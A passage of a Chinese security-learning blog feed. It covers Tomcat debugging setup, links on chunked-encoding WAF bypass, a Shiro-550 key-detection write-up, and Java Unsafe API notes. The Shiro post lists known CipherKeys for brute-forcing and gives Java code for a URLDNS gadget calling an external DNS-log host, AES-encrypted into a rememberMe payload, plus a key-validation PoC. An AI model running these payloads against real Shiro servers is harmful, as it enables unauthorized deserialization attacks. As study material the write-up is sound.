class="line">    &lt;version&gt;5.2.0&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.ant&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ant&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.9.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;wsdl4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.6.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.xml&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;ecj&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.5.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>接下来就是设置字节码版本（以自己的 JDK 版本为准），我的是 jdk 1.8，故配置如下：</p><p>项目结构-模块<br><img src="images/image-20221102105319386.png" alt="image-20221102105319386"></p><p>偏好设置-构建运行部署-编译器-Java 编译器<br><img src="images/image-20221102105407398.png" alt="image-20221102105407398"></p><p>运行 Java 项目，可能会遇见如下错误；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java: 找不到符号</span><br><span class="line">  符号:   变量 VERSION_9</span><br><span class="line">  位置: 类 org.eclipse.jdt.internal.compiler.impl.CompilerOptions</span><br></pre></td></tr></table></figure><p><img src="images/image-20221102104846234.png" alt="image-20221102104846234"></p><p>个人理解该报错原因是我的 JDK 版本为1.8，所以没有后面的符号变量（非准确说法，勿信），我的解决方案是把这些所有报错的红色变量都改为：<code>VERSION_1_8</code>，也可以注释掉<br><img src="images/image-20221102105557452.png" alt="image-20221102105557452"></p><p>现在项目可以正常运行了，调试情况如下：<br><img src="images/image-20221102105700077.png" alt="image-20221102105700077"></p><p>可以看到调用栈上关于 Tomcat 的部分，都有明显的颜色区分，步入进去是 java 源文件，而非 class 反编译的文件<br><img src="images/image-20221102105714779.png" alt="image-20221102105714779"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinking_in_java高级volatile</title>
      <link href="/2022/11/10/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/"/>
      <url>/2022/11/10/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</url>
      
        <content type="html"><![CDATA[<p><a href="https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/">https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>chunked-coding-converter</title>
      <link href="/2022/11/10/chunked-coding-converter/"/>
      <url>/2022/11/10/chunked-coding-converter/</url>
      
        <content type="html"><![CDATA[<h1 id="chunked-coding-converter"><a href="#chunked-coding-converter" class="headerlink" title="chunked-coding-converter"></a>chunked-coding-converter</h1><p><a href="https://mp.weixin.qq.com/s/pM1ULCqNdQwSB7hcltrbtw">唯快不破的分块传输绕WAF</a></p><p><a href="https://mp.weixin.qq.com/s/2DDYyvsZ5HIQC0qGMK9znQ">Bypass WAF HTTP协议覆盖+分块传输组合绕过</a></p><p><a href="https://mp.weixin.qq.com/s/eDiiiVX4oF0LYG3Ia5P4mw">利用分块传输吊打所有WAF</a></p><p><a href="https://www.freebuf.com/news/193659.html">技术讨论 | 在HTTP协议层面绕过WAF</a></p><p><a href="https://gv7.me/articles/2019/chunked-coding-converter/">编写Burp分块传输插件绕WAF</a></p><p><a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只有HTTP/1.1支持分块传输</span><br><span class="line">POST包都支持分块，不局限仅仅于反序列化和上传包</span><br><span class="line">Transfer-Encoding: chunked大小写不敏感</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro之key的检测</title>
      <link href="/2022/11/10/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
      <url>/2022/11/10/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro之key的检测"><a href="#Shiro之key的检测" class="headerlink" title="Shiro之key的检测"></a>Shiro之key的检测</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在说 key 的检测之前，先聊聊现在工具普遍用到的 key 吧。相信在了解 shiro 之前，大家都曾用过网上公开的 shiro 利用工具，其中对于 key 的检测，普遍采用的字典的形式进行爆破，这里列举几个在字典中存在的 key：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>第一个大家应该都眼熟了，是 1.2.4 版本的默认 CipherKey，那其他 CipherKey 是哪里来的呢？网上有几种观点：</p><ul><li>一个框架配置了某一个 Shiro CipherKey，大家写的项目都用到了该框架；</li><li>大家的项目互相抄来抄去，对于 CipherKey 并未修改；</li><li>见到其他项目使用该 CipherKey，也沿袭着使用了；</li><li>……</li></ul><p>我们尝试在 github 上搜索其中一个 CipherKey 试试<br><img src="images/image-20221023221126506.png" alt="image-20221023221126506"></p><p>发现大部分项目都是使用了同一个 CipherKey，缘，妙不可言~</p><p>言归正传，说回 Key 的检测，第一想法都是用 URLDNS 这条链子来进行检测。但实战环境中，很多时候遇上的主机都是不出网，这种情况如何解决呢？</p><p>L1NK3R 师傅提出的只依赖于 Shiro 本身，在 CipherKey 检测正确时不返回 deleteMe，错误情况时返回 deleteMe 的方法，解决了上述不出网的情况。下面就逐个进行学习一下。</p><h2 id="基于URLDNS的检测方法"><a href="#基于URLDNS的检测方法" class="headerlink" title="基于URLDNS的检测方法"></a>基于URLDNS的检测方法</h2><p>通过前面的学习，听到该方法名字应该都已经懂如何构造了，先通过学习的 URLDNS 链生成文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://851bdcd2.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再通过 Shiro 的<code>AesCipherService()</code>方法对前面生成的文件进行 AES 加密得到 payload<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>添加到 rememberMe 字段发送 payload<br><img src="images/image-20221024055133461.png" alt="image-20221024055133461"></p><p>最后执行反序列化流程，执行 URLDNS 链，发起 DNS 请求，打开平台看到已经收到了请求数据。<br><img src="images/image-20221024055148343.png" alt="image-20221024055148343"></p><h2 id="基于Shiro本身的检测方法"><a href="#基于Shiro本身的检测方法" class="headerlink" title="基于Shiro本身的检测方法"></a>基于Shiro本身的检测方法</h2><p>经过测试我们可以看到，在登录后携带正常的 rememberMe 发送请求并不会在返回包中存在<code>rememberMe=deleteMe</code>，但使用正确或者错误的 CipherKey 加密构造的 rememberMe 在发送请求后，都会在返回包中看到<code>rememberMe=deleteMe</code>的响应头。</p><p>那么如果我们能够使正确的 CipherKey 加密的 payload 执行后不回显<code>deleteMe</code>，错误的 CipherKey 加密的则回显<code>deleteMe</code>，那就能达到检测 CipherKey 是否正确的目的。</p><p>接下来的任务就是看看 CipherKey 正确和错误的情况下，流程是怎么走的，进行对比和分析。</p><h3 id="密钥错误"><a href="#密钥错误" class="headerlink" title="密钥错误"></a>密钥错误</h3><p>我们把断点打在最后的<code>AbstractRememberMeManager#deserialize()</code>方法处，然后用一个错误的 CipherKey 加密 URLDNS 的链子，发送请求<br><img src="images/image-20221024045034551.png" alt="image-20221024045034551"></p><p>接在跟进<code>decrypt()</code>方法直到<code>crypt()</code>方法<br><img src="images/image-20221024045303583.png" alt="image-20221024045303583"></p><p>在这里开始因为 CipherKey 错误抛出异常，在<code>getRememberedPrincipals()</code>方法中被捕获异常<br><img src="images/image-20221024045432663.png" alt="image-20221024045432663"></p><p>这里调用到了<code>onRememberedPrincipalFailure()</code>方法，跟进该方法<br><img src="images/image-20221024045929862.png" alt="image-20221024045929862"></p><p>接着调用了<code>forgetIdentity()</code>方法<br><img src="images/image-20221024050022401.png" alt="image-20221024050022401"></p><p>继续跟进<code>forgetIdentity(request, response)</code>方法<br><img src="images/image-20221024050046499.png" alt="image-20221024050046499"></p><p>调用到了<code>removeFrom()</code>方法，继续跟进<code>removeFrom()</code>方法<br><img src="images/image-20221024050136826.png" alt="image-20221024050136826"></p><p>可以看到，在该方法中定义了<code>deleteMe</code>字段并添加到响应头中</p><h3 id="密钥正确"><a href="#密钥正确" class="headerlink" title="密钥正确"></a>密钥正确</h3><p>因为 CipherKey 正确，所以这里进入了<code>doFinal()</code>方法，不会抛出异常<br><img src="images/image-20221024050454922.png" alt="image-20221024050454922"></p><p>然后一层层返回，最后到了 <code>return this.deserialize()</code>方法<br><img src="images/image-20221024050745000.png" alt="image-20221024050745000"></p><p>跟进<code>deserialize()</code>方法<br><img src="images/image-20221024050817471.png" alt="image-20221024050817471"></p><p>这里可以看到最后套了一层<code>(PrincipalCollection)</code>将返回的类转换成<code>PrincipalCollection</code>类，但转换失败，被<code>getRememberedPrincipals()</code>捕获了异常<br><img src="images/image-20221024051026334.png" alt="image-20221024051026334"></p><p>接下来就是跟前面一样进入到了<code>removeFrom()</code>方法<br><img src="images/image-20221024051128859.png" alt="image-20221024051128859"></p><p>至此，弄懂了 CipherKey 无论正确与否，进行加密的链子都会返回<code>deleteMe</code>的原因。</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>既然在 CipherKey 正确情况下，是因为类型强转导致的进入<code>removeFrom()</code>方法，那么我们只要将序列化的对象继承于<code>PrincipalCollection</code>类即可，那就找一下<code>PrincipalCollection</code>类的实现类<img src="images/image-20221024051738473.png" alt="image-20221024051738473"></p><p>这里选择<code>SimplePrincipalCollection</code>类或者<code>SimplePrincipalMap</code>类都可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.SimplePrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimplePrincipalCollection</span> <span class="variable">simplePrincipalCollection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimplePrincipalCollection</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(simplePrincipalCollection), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>密钥✅的情况：<br><img src="images/image-20221024055251820.png" alt="image-20221024055251820"></p><p>密钥❎的情况：<br><img src="images/image-20221024055335648.png" alt="image-20221024055335648"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>unsafe学习</title>
      <link href="/2022/11/10/unsafe%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/10/unsafe%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="unsafe学习"><a href="#unsafe学习" class="headerlink" title="unsafe学习"></a>unsafe学习</h1><h2 id="获取偏移量方法"><a href="#获取偏移量方法" class="headerlink" title="获取偏移量方法"></a>获取偏移量方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">objectFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取非静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayBaseOffset</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1中的第一个元素的偏移量，即数组的基础地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的实际地址，配合staticFieldOffset方法使用，可求出变量所在的段地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayIndexScale</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1的偏移量增量。结合arrayBaseOffset(Class&lt;?&gt; var1)方法就可以求出数组中各个元素的地址。</span></span><br></pre></td></tr></table></figure><h2 id="操作属性方法"><a href="#操作属性方法" class="headerlink" title="操作属性方法"></a>操作属性方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//获取var1对象中偏移量为var2的Object对象，该方法可以无视修饰符限制。相同方法有getInt、getLong、getBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//将var1对象中偏移量为var2的Object对象的值设为var4，该方法可以无视修饰符限制。相同的方法有putInt、putLong、putBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//功能与getObject(Object var1, long var2)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有getIntVolatile、getLongVolatile、getBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有putIntVolatile、putLongVolatile、putBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putOrderedObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的有序性(不保证可见性)，可以无视修饰符限制。相同的方法有putOrderedInt、putOrderedLong等。</span></span><br></pre></td></tr></table></figure><h2 id="操作内存方法"><a href="#操作内存方法" class="headerlink" title="操作内存方法"></a>操作内存方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">addressSize</span><span class="params">()</span>;<span class="comment">//获取本地指针大小，单位为byte，通常值为4或8。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">pageSize</span><span class="params">()</span>;<span class="comment">//获取本地内存的页数，该返回值会是2的幂次方。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">allocateMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//开辟一块新的内存块，大小为var1(单位为byte)，返回新开辟的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">reallocateMemory</span><span class="params">(<span class="type">long</span> var1, <span class="type">long</span> var3)</span>;<span class="comment">//将内存地址为var3的内存块大小调整为var1(单位为byte)，返回调整后新的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">setMemory</span><span class="params">(<span class="type">long</span> var2, <span class="type">long</span> var4, <span class="type">byte</span> var6)</span>;<span class="comment">//从实际地址var2开始将后面的字节都修改为var6，修改大小为var4(通常为0)。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">copyMemory</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, <span class="type">long</span> var5, <span class="type">long</span> var7)</span>;<span class="comment">//从对象var1中偏移量为var2的地址开始复制，复制到var4中偏移量为var5的地址，复制大小为var7。当var1为空时，var2就不是偏移量而是实际地址，当var4为空时，var5就不是偏移量而是实际地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">freeMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//释放实际地址为var1的内存。</span></span><br></pre></td></tr></table></figure><h2 id="线程挂起和恢复方法"><a href="#线程挂起和恢复方法" class="headerlink" title="线程挂起和恢复方法"></a>线程挂起和恢复方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">unpark</span><span class="params">(Object var1)</span>;<span class="comment">//将被挂起的线程var1恢复，由于其不安全性，需保证线程var1是存活的。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">park</span><span class="params">(<span class="type">boolean</span> var1, <span class="type">long</span> var2)</span>;<span class="comment">//当var2等于0时，线程会一直挂起，知道调用unpark方法才能恢复。当var2大于0时，如果var1为false，这时var2为增量时间，即线程在被挂起var2秒后会自动恢复，如果var1为true，这时var2为绝对时间，即线程被挂起后，得到具体的时间var2后才自动恢复。</span></span><br></pre></td></tr></table></figure><h2 id="CAS方法"><a href="#CAS方法" class="headerlink" title="CAS方法"></a>CAS方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span 